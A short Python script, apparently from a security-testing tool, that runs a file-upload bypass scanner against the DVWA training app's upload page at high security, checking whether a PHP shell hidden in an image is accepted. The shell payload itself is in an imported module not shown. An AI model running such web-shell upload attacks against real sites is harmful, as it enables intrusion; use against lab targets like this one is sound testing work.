from checkUploadBypass import FileUploadScanner

if __name__ == '__main__':

    url = "http://dvwa.com:80/vulnerabilities/upload/"
    cookies = {"PHPSESSID": "u2t131j6smuvdkhnmvvhs9oaia", "security": "high"}
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36",
        "Accept": "*/*", "Accept-Encoding": "gzip, deflate",
        "Content-Type": "multipart/form-data; boundary=75536299ff9045f38a5c79cedb68286d", "Connection": "close"
    }


    FileUploadScanner.check_image_shell(FileUploadScanner(flag_str="succesfully uploaded!"),'php', url, cookies, headers)